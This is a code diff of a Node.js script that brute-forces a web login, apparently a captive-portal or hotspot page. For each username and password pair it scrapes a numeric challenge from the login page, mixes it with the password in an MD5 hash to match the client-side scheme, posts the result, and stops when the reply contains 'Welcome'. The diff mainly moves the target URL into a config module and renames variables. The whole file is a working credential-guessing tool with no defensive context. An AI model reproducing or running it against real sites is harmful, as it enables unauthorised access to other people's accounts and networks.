@@ -2,9 +2,8 @@ let cheerio = require('cheerio'),
     request = require('sync-request'),
     md5 = require('./md5'),
     dataMapHex=require('./hex'),
-    data = require('./data');
-
-var url='http://localjuve.com';
+    data = require('./data'),
+    conf = require('./conf');
 
 for (let i = 0; i < data.users.length; i++) {
     for (let x = 0; x < data.passwords.length; x++) {
@@ -15,33 +14,30 @@ for (let i = 0; i < data.users.length; i++) {
 function main(user,password){
 
     console.log(user+"--"+password);
-    let passEncrypted=(encrypt_data(extractNumbers(makeRequest(url)),password));
-    let bodyHtml = (makePost(user,passEncrypted));
 
-    if (bodyHtml.includes('Welcome')) {
+    if ((makePost(user,(encrypt_data(extractNumbers(makeRequest()),password)))).includes('Welcome')) {
          console.log('Valid user: '+user+"--"+password);
          process.exit();
      }
 }
 
-function makeRequest(url) {
-    let response = request('GET', url);
-    let html=response.getBody('utf8');
-    let $ = cheerio.load(html);
+function makeRequest() {
+    let $ = cheerio.load((request('GET', conf.url)).getBody('utf8'));
     return $('script').get()[1].children[0].data;
 }
 
 function extractNumbers(dataFunctionLogin) {
-    let numExtract = dataFunctionLogin.replace(/[^0-9]/g,'');
+    let numbersExtracted = dataFunctionLogin.replace(/[^0-9]/g,'');
+   
     let numbers=[];
     let count=1;
-    let number='';
-    while(count<numExtract.length){
-        number += numExtract.charAt(count++);
-        number += numExtract.charAt(count++);
-        number += numExtract.charAt(count++);
+    
+    while(count<numbersExtracted.length){
+        let number='';
+        number += numbersExtracted.charAt(count++);
+        number += numbersExtracted.charAt(count++);
+        number += numbersExtracted.charAt(count++);
         numbers.push(number);
-        number='';
     }
     // return array numbers
     return numbers;
@@ -50,21 +46,22 @@ function extractNumbers(dataFunctionLogin) {
 function encrypt_data(numbers,password){
     //numbers is array
 
-    let i = 0
-    let dataHex = new Array();
-    while(i<numbers.length){
-        dataHex.push(dataMapHex.mapHex.get(numbers[i]));
-        i++;
+    let count = 0
+    let dataOnHex = new Array();
+
+    while(count<numbers.length){
+        dataOnHex.push(dataMapHex.mapHex.get(numbers[count]));
+        count++;
     }
     
-    return md5.hexMD5(dataHex[0]+password+dataHex[1]+dataHex[2]+dataHex[3]+dataHex[4]+dataHex[5]+dataHex[6]+dataHex[7]+dataHex[8]+dataHex[9]+dataHex[10]+dataHex[11]+dataHex[12]+dataHex[13]+dataHex[14]+dataHex[15]+dataHex[16]);
+    return md5.hexMD5(dataOnHex[0]+password+dataOnHex[1]+dataOnHex[2]+dataOnHex[3]+dataOnHex[4]+dataOnHex[5]+dataOnHex[6]+dataOnHex[7]+dataOnHex[8]+dataOnHex[9]+dataOnHex[10]+dataOnHex[11]+dataOnHex[12]+dataOnHex[13]+dataOnHex[14]+dataOnHex[15]+dataOnHex[16]);
 }
 
-function makePost(user,passEncrypted) {
-    let response = request('POST',url,
+function makePost(user,passwordEncrypted) {
+    let response = request('POST',conf.url,
         {
            headers:{'Content-Type':'application/x-www-form-urlencoded'},
-           body:'username='+user+'&'+'password='+passEncrypted+'&dst=&popup=true'
+           body:'username='+user+'&'+'password='+passwordEncrypted+'&dst=&popup=true'
         }
     );
 
